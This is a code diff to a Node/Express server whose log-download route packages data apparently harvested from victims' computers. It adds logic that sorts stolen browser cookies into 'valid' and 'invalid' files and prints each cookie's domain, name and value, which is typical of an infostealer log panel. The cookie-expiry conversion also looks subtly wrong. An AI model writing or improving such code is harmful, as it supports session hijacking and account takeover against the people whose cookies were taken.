@@ -646,16 +646,94 @@ app.get('/api/download/:logId', (req, res) => {
 
         archive.append(JSON.stringify(logData, null, 2), { name: 'log_data.json' });
 
+        // Helper function to check if a cookie is non-expired
+        const isCookieNonExpired = (cookie) => {
+            if (!cookie || cookie.expires === undefined || cookie.expires === null) {
+                return true; // Session cookie or no expiration - consider it valid
+            }
+            
+            // expires_utc is in microseconds since Windows epoch (1601-01-01)
+            const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+            
+            // If expires is 0, it's a session cookie (never expires)
+            if (cookie.expires === 0) {
+                return true;
+            }
+            
+            try {
+                // Convert microseconds to milliseconds, then subtract epoch difference
+                const expiresMs = (cookie.expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+                const expiresDate = new Date(expiresMs);
+                
+                // Validate the date is reasonable
+                if (isNaN(expiresDate.getTime())) {
+                    return true; // If we can't parse it, assume it's valid
+                }
+                
+                // Check if expiration is in the future
+                return expiresDate > new Date();
+            } catch (e) {
+                return true; // If parsing fails, assume it's valid
+            }
+        };
+
         // Add separate files for large data sections if they exist
         if (log.pcData) {
             const pcData = log.pcData;
             
-            // Browser cookies
+            // Browser cookies - separate into valid and invalid
             if (pcData.browserCookies) {
-                const cookiesData = typeof pcData.browserCookies === 'string' 
-                    ? pcData.browserCookies 
-                    : JSON.stringify(pcData.browserCookies, null, 2);
-                archive.append(cookiesData, { name: 'browser_cookies.json' });
+                let cookies = [];
+                
+                // Parse cookies from string or array
+                if (typeof pcData.browserCookies === 'string') {
+                    try {
+                        cookies = JSON.parse(pcData.browserCookies);
+                    } catch (e) {
+                        // If parsing fails, try to extract cookie data from string
+                        cookies = [];
+                    }
+                } else if (Array.isArray(pcData.browserCookies)) {
+                    cookies = pcData.browserCookies;
+                }
+                
+                if (Array.isArray(cookies) && cookies.length > 0) {
+                    const validCookies = [];
+                    const invalidCookies = [];
+                    
+                    cookies.forEach(cookie => {
+                        const cookieText = `Domain: ${cookie.domain || cookie.host || 'N/A'}\n` +
+                                        `Name: ${cookie.name || 'N/A'}\n` +
+                                        `Path: ${cookie.path || 'N/A'}\n` +
+                                        `Value: ${cookie.value || 'N/A'}\n` +
+                                        `Secure: ${cookie.secure || cookie.isSecure ? 'Yes' : 'No'}\n` +
+                                        `HttpOnly: ${cookie.httpOnly || cookie.isHttpOnly ? 'Yes' : 'No'}\n` +
+                                        `Expires: ${cookie.expires || cookie.expires_utc || 'Session Cookie'}\n` +
+                                        `---\n`;
+                        
+                        if (isCookieNonExpired(cookie)) {
+                            validCookies.push(cookieText);
+                        } else {
+                            invalidCookies.push(cookieText);
+                        }
+                    });
+                    
+                    // Add valid cookies file
+                    if (validCookies.length > 0) {
+                        archive.append(validCookies.join('\n'), { name: 'valid_cookies.txt' });
+                    }
+                    
+                    // Add invalid/expired cookies file
+                    if (invalidCookies.length > 0) {
+                        archive.append(invalidCookies.join('\n'), { name: 'invalid_cookies.txt' });
+                    }
+                } else {
+                    // If cookies couldn't be parsed as array, save as JSON
+                    const cookiesData = typeof pcData.browserCookies === 'string' 
+                        ? pcData.browserCookies 
+                        : JSON.stringify(pcData.browserCookies, null, 2);
+                    archive.append(cookiesData, { name: 'browser_cookies.json' });
+                }
             }
 
             // Browser history
